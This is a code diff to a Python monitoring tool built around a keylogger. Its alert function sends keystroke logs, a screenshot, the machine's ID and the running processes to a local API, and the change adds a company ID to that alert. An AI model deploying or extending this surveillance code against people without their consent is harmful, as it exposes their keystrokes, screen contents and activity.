@@ -7,14 +7,12 @@ import json  # For API
 import psutil as ps  # For process
 from scapy.layers.dns import DNS # For Sniffer
 from scapy.all import * # For Sniffer
-import credenciais as cr  # For API
 import threading    # For paralelism
 import socket   # For Scanner
 from IPy import IP  # For Scanner
 import openai
-import pyshark
 
-
+COMPANY = 1
 PATH_OF_THE_LOGS = "C:\keyLogger\logs\logs_" + str(time.monotonic_ns()) + ".txt"
 
 
@@ -150,7 +148,7 @@ def send_alert(log, alert_json):
     headers = do_login()
 
     try:
-        data_alert = json.dumps({"log": log, "pcId": str(gma()), "image": get_image(), "processos": get_process(), "models": alert_json['models'], "language": alert_json['language']},
+        data_alert = json.dumps({"log": log, "pcId": str(gma()), "image": get_image(), "processos": get_process(), "models": alert_json['models'], "language": alert_json['language'], "company": {"companyId": COMPANY}},
                                sort_keys=True, indent=4)
         alert = requests.post("http://localhost:9000/alert", data_alert, headers=headers)
 
